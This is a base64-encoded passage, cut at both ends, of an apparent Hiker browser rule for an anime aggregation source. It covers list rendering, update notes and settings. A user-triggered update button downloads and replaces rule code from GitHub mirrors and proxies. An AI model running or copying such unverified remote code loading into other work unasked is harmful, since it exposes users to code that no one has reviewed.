ICAgIH0gY2F0Y2ggKGUpIHsgcmV0dXJuICcnIH1cXFxcbiAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgcmVzID0ge1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSwgdXJsOiB1cmwsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogZGVzYywgaW1nOiBpbWcsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IE1ZX1JVTEUuY29sX3R5cGVcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgaWYgKHJlcy51cmwpIHtcXFxcbiAgICAgICAgICAgIGlmIChyZXMudXJsLmluY2x1ZGVzKCdAbGF6eVJ1bGU9JykpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcmVJbmRleCA9IHJlcy51cmwuaW5kZXhPZignLmpzOicpXFxcXG4gICAgICAgICAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgcmVzLnVybCA9IHJlcy51cmwuc2xpY2UoMCwgcmVJbmRleCkgKyAnLmpzOicgKyBoaWphY2tMYXp5UnVsZSArICc7JyArIHJlcy51cmwuc2xpY2UocmVJbmRleCArIDQpXFxcXG4gICAgICAgICAgICB9IGVsc2UgIGlmIChkZXRhaWxGaW5kUnVsZSkge1xcXFxuICAgICAgICAgICAgICAgIHJlcy5leHRyYSA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBnZW5FeFVybCh1cmwpLFxcXFxuICAgICAgICAgICAgICAgICAgICBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoT2JqZWN0LmFzc2lnbihnZW5NeVJ1bGUoKSwgeyBkZXRhaWxfZmluZF9ydWxlOiBkZXRhaWxGaW5kUnVsZSB9KSkpLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGlzSW5kZXggJiYgdGl0bGVcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgcmVzLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoTVlfUlVMRS5kZXRhaWxfZmluZF9ydWxlKSB7XFxcXG4gICAgICAgICAgICAgICAgcmVzLmV4dHJhID0ge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IGdlbkV4VXJsKHVybCksXFxcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGlzSW5kZXggJiYgdGl0bGVcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgcmVzLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBteUNvbGxfZWwucHVzaChyZXMpXFxcXG4gICAgfSlcXFxcbiAgICBzZXRSZXN1bHQobXlDb2xsX2VsKVxcXFxufVxcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pu05paw6K+m5oOFXFxcIixcXFwicGF0aFxcXCI6XFxcIlVwXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIHJlcyA9IHt9O1xcXFxudmFyIGl0ZW1zID0gW107XFxcXG52YXIgaW1nID0gJ2h0dHBzOi8vYmluZy5pbWcucnVuLzEzNjZ4NzY4LnBocCc7XFxcXG5pdGVtcy5wdXNoKHtcXFxcbiAgICBpbWc6IGltZyxcXFxcbiAgICB1cmw6IGltZyArIFxcXFxcXFwiIy5qcGdcXFxcXFxcIixcXFxcbiAgICBkZXNjOiAnMCcsXFxcXG4gICAgY29sX3R5cGU6ICdjYXJkX3BpY18xJ1xcXFxufSk7XFxcXG5cXFxcbml0ZW1zLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnTxoND7jgJDpmIXliqjmvKvwn5Su5Y+N6aaI5pS26ZuG44CRPC9oND5cXFxcXFxcIiArICc8c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiBncmV5XFxcXFxcXCI+5bCP5bCPPC9zcGFuPicsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvbWFuYWdlUnVsZSNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSM/cnVsZT3pgZPplb/ku5PlupNQcm9cXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBsdmVyOiBNWV9QQVJBTVMudmVyc2lvbiB8fCBcXFxcXFxcIuiOt+WPlueJiOacrOWksei0pe+8jOiHquihjOafpeeci1xcXFxcXFwiLFxcXFxuICAgICAgICBpZDogXFxcXFxcXCI2ODAzXFxcXFxcXCJcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxuaWYgKGdldEl0ZW0oXFxcXFxcXCJyZWFkX3BvbGljeVxcXFxcXFwiKSAhPT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08c21hbGw+PGZvbnQgY29sb3I9Izg3MWY3OD7mnKzop4TliJnmlbDmja7mnaXmupDkuo7nvZHnu5zvvIzlpoLmgqjllpzmrKLvvIzor7fmlK/mjIHlrpjmlrk8L2ZvbnQ+PC9zbWFsbD4nLFxcXFxuICAgICAgICBkZXNjOiAn4oCc4oCc4oCd4oCdPHNtYWxsPjxmb250IGNvbG9yPSNmMjBjMDA+5pys6KeE5YiZ5LuF6ZmQ5YWN6LS55a2m5Lmg5Lqk5rWB5L2/55So77yM6K+35LqO5a+85YWl5ZCOMjTlsI/ml7blhoXliKDpmaTvvIzku7vkvZXnu4Tnu4fmiJbkuKrkurrkuI3lvpfku6Xku7vkvZXmlrnlvI/mlrnms5XkvKDmkq3miJbllK7ljZbmraTop4TliJnnmoTmlbTkvZPmiJbpg6jliIbvvIE8L2ZvbnQ+PC9zbWFsbD4nLFxcXFxuICAgICAgICB1cmw6ICQoJyNub0hpc3RvcnkjJykubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcInJlYWRfcG9saWN5XFxcXFxcXCIsIFxcXFxcXFwiMVxcXFxcXFwiKVxcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+S9oOW3suWQjOaEj+ivpeWNj+iurlxcXFxcXFwiXFxcXG4gICAgICAgIH0pLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxcXG4gICAgfSlcXFxcbn1cXFxcblxcXFxuaXRlbXMucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ08Yj7mm7TmlrDlhazlkYo8L2I+JyxcXFxcbiAgICB1cmw6IFxcXFxcXFwiaHR0cHM6Ly9pbWcudmludWEuY24vaW1hZ2VzL3ZrbjNKLmpwZWdcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5cXFxcbmxldCBuZXdWZXJzaW9uO1xcXFxubGV0IG15VmVyc2lvbiA9IE1ZX1BBUkFNUy52ZXJzaW9uO1xcXFxudHJ5IHtcXFxcbiAgICBuZXdWZXJzaW9uID0gSlNPTi5wYXJzZShmZXRjaFBDKFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL2Rldi9nZXRieWlkP2lkPTY3NDlcXFxcXFxcIiwge1xcXFxuICAgICAgICB0aW1lb3V0OiAxMDAwXFxcXG4gICAgfSkpLnJlc3VsdC52ZXI7XFxcXG59IGNhdGNoIChlKSB7XFxcXG4gICAgdG9hc3QoXFxcXFxcXCLpgZPplb/ku5PlupPmir3po47kuobvvIzmnKzmrKHmnKrmo4DmtYvliLDmlrDniYjkv6Hmga9cXFxcXFxcIik7XFxcXG4gICAgbmV3VmVyc2lvbiA9IG15VmVyc2lvbjtcXFxcbn1cXFxcbmxldCBpc1VwZGF0ZSA9IE51bWJlcihuZXdWZXJzaW9uKSA+IE51bWJlcihteVZlcnNpb24pO1xcXFxubGV0IGlzVmVyID0gTnVtYmVyKG5ld1ZlcnNpb24pID09PSBOdW1iZXIobXlWZXJzaW9uKTtcXFxcbmlmIChpc1VwZGF0ZSkge1xcXFxuICAgIGxvZygn5pyJ5paw54mI5pysOicgKyBuZXdWZXJzaW9uICsgJyzlvZPliY06JyArIG15VmVyc2lvbik7XFxcXG59XFxcXG5pdGVtcy5wdXNoKHtcXFxcbiAgICB0aXRsZTogaXNVcGRhdGUgPyBcXFxcXFxcIvCfhpnmlrDniYjmnKxcXFxcXFxcIiA6IFxcXFxcXFwi6YGT6ZW/5LuT5bqT5YaF5pu05pawXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBpc1VwZGF0ZSA/IFxcXFxcXFwiXFxcXFxcXCIgOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9tYW5hZ2VSdWxlI25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9ydWxlPemBk+mVv+S7k+W6k1Byb1xcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGx2ZXI6IE1ZX1BBUkFNUy52ZXJzaW9uIHx8IFxcXFxcXFwi6I635Y+W54mI5pys5aSx6LSl77yM6Ieq6KGM5p+l55yLXFxcXFxcXCIsXFxcXG4gICAgICAgIGlkOiBcXFxcXFxcIjY4MDNcXFxcXFxcIlxcXFxuICAgIH1cXFxcbn0pO1xcXFxuY29uc3QgQ29sb3IgPSBcXFxcXFxcIiMxOUI4OURcXFxcXFxcIjtcXFxcbnZhciBkZXNfZGVzYyA9ICc8aDEgc3R5bGU9XFxcXFxcXCJ0ZXh0LWFsaWduOiBjZW50ZXI7XFxcXFxcXCI+8J+QvuabtOaWsFsyNDAxMDZdPC9oMT4nICtcXFxcbiAgICAnPDxibG9ja3F1b3RlPjxmb250IGNvbG9yPVxcXFxcXFwicmVkXFxcXFxcXCI8YnI+4pGg5paw5aKe54uX55WqPC9icj7ikaHliZTpmaTlpLHmlYjmupDvvIzkv67lpI3okIznlaov6Lev5ryr5ryrL+WKqOa8q+ibiy/lpYfnsbM8L2JyPjxibG9ja3F1b3RlPicgK1xcXFxuXFxcXG4nPGgxIHN0eWxlPVxcXFxcXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXFxcXFwiPvCfkL7mm7TmlrBbMjMxMDIzXTwvaDE+JyArXFxcXG4gICAgJzw8YmxvY2txdW90ZT48Zm9udCBjb2xvcj1cXFxcXFxcInJlZFxcXFxcXFwiPGJyPuKRoOWbp+asoeWFg++8jOearuearuiZvuWKqOa8q++8jOS4g+iJsuWKqOa8q++8jGdpcmlnaXJp54ix5Yqo5ryr77yMTlTliqjmvKvvvIzmlbTnkIbliIbnsbvvvIzpobXpnaLkvJjljJY8L2JyPuKRoeWinuWKoOabtOaWsOmhtemdoi/lj43ppojpobXpnaLikaLkvJjljJbpmIXliqjmvKvmnKzkvZPvvIzkuI7ml6fop4TliJnkuI3lhbzlrrnvvIzpnIDliKDpmaTlho3lr7zlhaXmm7TmlrDop4TliJk8L2JyPjxibG9ja3F1b3RlPidcXFxcblxcXFxuaXRlbXMucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfmm7TmlrDor6bmg4UgPHNtYWxsPjxzbWFsbD48c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiMxOUI4OURcXFxcXFxcIj7lsZXlvIA+PC9zcGFuPjwvc21hbGw+PC9zbWFsbD4nLFxcXFxuICAgIGltZzogXFxcXFxcXCJodHRwczovL2xhbm1laWd1b2ppYW5nLmNvbS90dWJpYW8vbW9yZS8xOTcucG5nXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGpqaWQsIGRlY2lkLCBkZXNfZGVzYykgPT4ge1xcXFxuICAgICAgICBpZiAoZ2V0TXlWYXIoXFxcXFxcXCJqanNcXFxcXFxcIiwgXFxcXFxcXCLmlLbotbdcXFxcXFxcIikgPT0gXFxcXFxcXCLmlLbotbdcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJqanNcXFxcXFxcIiwgXFxcXFxcXCLlsZXlvIBcXFxcXFxcIik7XFxcXG5cXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBqamlkXFxcXG4gICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+abtOaWsOivpuaDhSA8c21hbGw+PHNtYWxsPjxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6IzE5Qjg5RFxcXFxcXFwiPuaUtui1tz48L3NwYW4+PC9zbWFsbD48L3NtYWxsPidcXFxcbiAgICAgICAgICAgIH0pXFxcXG5cXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRleHRTaXplOiAxNCxcXFxcbiAgICAgICAgICAgICAgICAgICAgbGluZVNwYWNpbmc6IDMsXFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBkZWNpZFxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICc8c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiM4MDgwODBcXFxcXFxcIj4nICsgZGVzX2Rlc2MgKyAnPC9zcGFuPidcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiampzXFxcXFxcXCIsIFxcXFxcXFwi5pS26LW3XFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBpZDogamppZFxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICfmm7TmlrDor6bmg4U8c21hbGw+PHNtYWxsPjxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6IzE5Qjg5RFxcXFxcXFwiPuWxleW8gD48L3NwYW4+PC9zbWFsbD48L3NtYWxsPidcXFxcbiAgICAgICAgICAgIH0pXFxcXG5cXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRleHRTaXplOiAxNCxcXFxcbiAgICAgICAgICAgICAgICAgICAgbGluZVNwYWNpbmc6IDMsXFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBkZWNpZFxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICc8c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiM4MDgwODBcXFxcXFxcIj4nICsgZGVzX2Rlc2Muc3Vic3RyKDAsIDE1MClcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgfSwgTVlfUlVMRSArIFxcXFxcXFwiX2pqaWRcXFxcXFxcIiwgTVlfUlVMRSArIFxcXFxcXFwiX2RlY2lkXFxcXFxcXCIsIGRlc19kZXNjKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJhdmF0YXJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBpZDogTVlfUlVMRSArIFxcXFxcXFwiX2pqaWRcXFxcXFxcIlxcXFxuICAgIH1cXFxcbn0pO1xcXFxuXFxcXG5pdGVtcy5wdXNoKHtcXFxcbiAgICB0aXRsZTogJzxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6IzgwODA4MFxcXFxcXFwiPicgKyBkZXNfZGVzYy5zdWJzdHIoMCwgMTUwKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0ZXh0U2l6ZTogMTQsXFxcXG4gICAgICAgIGxpbmVTcGFjaW5nOiAzLFxcXFxuICAgICAgICBpZDogTVlfUlVMRSArIFxcXFxcXFwiX2RlY2lkXFxcXFxcXCJcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxucmVzLmRhdGEgPSBpdGVtcztcXFxcbnNldEhvbWVSZXN1bHQocmVzKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwiaWNvbl8yX3JvdW5kXFxcIixcXFwibmFtZVxcXCI6XFxcIuiuvue9rlxcXCIsXFxcInBhdGhcXFwiOlxcXCJDb25maWdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5hZGRMaXN0ZW5lcignb25DbG9zZScsICdjbGVhck15VmFyKFxcXFxcXFwic29ydEZsYWdcXFxcXFxcIik7cmVmcmVzaFBhZ2UoKScpXFxcXG5zZXRQYWdlVGl0bGUoJ+KamSDpmIXliqjmvKvwn5Su6K6+572uIOKamScpXFxcXG5jb25zdCBRSU5HX1RJVExFID0gZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpLFxcXFxuICAgIHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcXFxubGV0IGRhdGEgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFLCB0cnVlKSxcXFxcbiAgICBlbCA9IFt7XFxcXG4gICAgICAgIHRpdGxlOiAnPGI+IOa4hemZpOe8k+WtmO+8jOeri+WNs+abtOaWsCA8c21hbGw+IO+8iOWfuuS6jui/nOeoi+S7k+W6k++8jOayoeS6i+WIq+eCue+8jOWPr+avj+aciOeCueS4gOasoeabtOaWsO+8iScsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIua4hemZpOe8k+WtmO+8jOeri+WNs+abtOaWsFxcXFxcXFwiKS5jb25maXJtKCh1cmwpID0+IHtcXFxcbiAgICAgICAgICAgIC8v6L+c56iL5L6d6LWW57Si5byV5paH5Lu25Luj55CG5Zyw5Z2A5YiX6KGoXFxcXG4gICAgICAgICAgICBsZXQgcmVxdWlyZWxpc3QgPSBbJ2h0dHBzOi8vcmF3LmlxaXEuaW8vJywgJ2h0dHBzOi8vZ2l0aHViLmpldm9ucy52aXAvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsICdodHRwczovL2docHJveHkuY29tL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCAnaHR0cHM6Ly9jZG4uc3RhdGljYWx5LmNvbS9naC8nLCAnaHR0cHM6Ly9naXRodWIuamV2b25zLnZpcC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vJ11cXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcmVxdWlyZWxpc3QubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICB0cnkgeyAvL+i/nOeoi+S+nei1lue0ouW8lVxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcmVzID0gcmVxdWVzdChyZXF1aXJlbGlzdFtpXSArICdRUTE5OTNIVUFORy9ZTUovbWFpbi8nLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB3aXRoU3RhdHVzQ29kZTogdHJ1ZVxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAoSlNPTi5wYXJzZShyZXMpLnN0YXR1c0NvZGUgPT0gMjAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KHVybCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKHVybClcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1aXJlRG93bmxvYWQocmVxdWlyZWxpc3RbaV0gKyAnUVExOTkzSFVBTkcvWU1KL21haW4nLHVybClcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1aXJlRG93bmxvYWQocmVxdWlyZWxpc3RbaV0gKyAnUVExOTkzSFVBTkcvWU1KL21haW4nLHVybClcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge31cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpXFxcXG4gICAgICAgICAgICBiYWNrKGZhbHNlKVxcXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suabtOaWsCdcXFxcbiAgICAgICAgfSwgdXJsKSxcXFxcbiAgICAgICAgaW1nOiAnaGlrZXI6Ly9pbWFnZXMvaWNvbjQnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcidcXFxcbiAgICB9XSxcXFxcbiAgICB1cGRhdGVJbnRlcnZhbCA9IHJlYWRGaWxlKCd1cGRhdGVJbnRlcnZhbCcpIHx8ICcxJyxcXFxcbiAgICBuZXdXaW5kb3cgPSByZWFkRmlsZSgnbmV3V2luZG93JyksXFxcXG4gICAgdGFiRm9sZCA9IHJlYWRGaWxlKCd0YWJGb2xkJyksXFxcXG4gICAgZGlzYWJsZUN1c3RvbSA9IHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJyksXFxcXG4gICAgZWRpdE1vZGUgPSBkaXNhYmxlQ3VzdG9tID8gJ+WvvOWFpea1t+mYlCcgOiBnZXRNeVZhcignZWRpdE1vZGUnLCAn5ZCv55SoL+emgeeUqCcpXFxcXG5cXFxcbmVsLnB1c2goe1xcXFxuICAgIHRpdGxlOiAnICDwn5KhIOabtOaWsOmikeeOhzogJyArICh1cGRhdGVJbnRlcnZhbCA9PSAwID8gJ+aJi+WKqCcgOiB1cGRhdGVJbnRlcnZhbCArICflpKknKSArICcgICcsXFxcXG4gICAgdXJsOiAkKHVwZGF0ZUludGVydmFsLCAn6L6T5YWl5pu05paw6Ze06ZqU77yI5aSp77yJ77yM5Li6MOWImeaJi+WKqOabtOaWsFxcXFxcXFxcbuacrOWcsOaWh+S7tumTvuaOpeaXoOaViCcpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgaW5wdXQgPSBwYXJzZUludChpbnB1dClcXFxcbiAgICAgICAgaWYgKE51bWJlci5pc05hTihpbnB1dCkpIGlucHV0ID0gMVxcXFxuICAgICAgICBlbHNlIGlmIChpbnB1dCA8IDEpIGlucHV0ID0gMFxcXFxuICAgICAgICBzYXZlRmlsZSgndXBkYXRlSW50ZXJ2YWwnLCBpbnB1dC50b1N0cmluZygpKVxcXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxcXG59LCB7XFxcXG4gICAgdGl0bGU6ICcgIPCflqUg54us56uL6aaW6aG1OiAnICsgKG5ld1dpbmRvdyA/ICfmmK8nIDogJ+WQpicpICsgJyAgJyxcXFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKG5ld1dpbmRvdykgPT4ge1xcXFxuICAgICAgICBzYXZlRmlsZSgnbmV3V2luZG93JywgbmV3V2luZG93ID8gJycgOiAnVCcpXFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXFxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgIH0sIG5ld1dpbmRvdyksXFxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcXFxufSwge1xcXFxuICAgIHRpdGxlOiAnICDwn5KgIOWIhuexu+aKmOWPoDogJyArICh0YWJGb2xkID8gJ+aYrycgOiAn5ZCmJykgKyAnICAnLFxcXFxuICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodGFiRm9sZCkgPT4ge1xcXFxuICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQgPyAnJyA6ICdUJylcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfSwgdGFiRm9sZCksXFxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcXFxufSwge1xcXFxuICAgIHRpdGxlOiAnICDwn5K8IOWkh+S7veaBouWkjSAgJyxcXFxcbiAgICB1cmw6ICQoWyflpIfku70nLCAn5oGi5aSNJ10sIDEpLnNlbGVjdCgoUUlOR19USVRMRSwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSkgPT4ge1xcXFxuICAgICAgICBsZXQgdXJsID0gZ2V0TXlWYXIoJ3JlbW90ZVVybCcpXFxcXG4gICAgICAgIGlmICghdXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgJiYgIXVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpXFxcXG4gICAgICAgICAgICB1cmwgPSAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnXFxcXG4gICAgICAgIGVsc2UgaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovL3BhZ2UvJykpIHVybCA9ICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICBpZiAoaW5wdXQgPT0gJ+Wkh+S7vScpIHJldHVybiAkKCdoaWtlcjovL2ZpbGVzL3RtcC8nICsgUUlOR19USVRMRSArICdfYmFja3VwLmpzb24nLCAn6L6T5YWl5aSH5Lu96Lev5b6EJylcXFxcbiAgICAgICAgICAgIC5pbnB1dCgodXJsLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gcmVxdWVzdCh1cmwpLFxcXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhID0gcmVhZEZpbGUoJ2N1c3RvbURhdGEnKVxcXFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShpbnB1dCwgSlNPTi5zdHJpbmdpZnkoe1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnRlcnZhbDogdXBkYXRlSW50ZXJ2YWwsXFxcXG4gICAgICAgICAgICAgICAgICAgIG5ld1dpbmRvdzogbmV3V2luZG93LFxcXFxuICAgICAgICAgICAgICAgICAgICB0YWJGb2xkOiB0YWJGb2xkLFxcXFxuICAgICAgICAgICAgICAgICAgICBkaXNhYmxlQ3VzdG9tOiBkaXNhYmxlQ3VzdG9tLFxcXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhOiBjdXN0b21EYXRhLFxcXFxuICAgICAgICAgICAgICAgICAgICBydWxlczogcnVsZXNcXFxcbiAgICAgICAgICAgICAgICB9KSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5aSH5Lu977yM5rOo5oSP6Iul5LuT5bqT5Li65a2Q6aG16Z2i5YiZ5LiN5aSH5Lu9J1xcXFxuICAgICAgICAgICAgfSwgdXJsLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKVxcXFxuICAgICAgICBlbHNlIHJldHVybiAkKCdoaWtlcjovL2ZpbGVzL3RtcC8nICsgUUlOR19USVRMRSArICdfYmFja3VwLmpzb24nLCAn6L6T5YWl5aSH5Lu96Lev5b6EJykuaW5wdXQoKHVybCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IHsgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSwg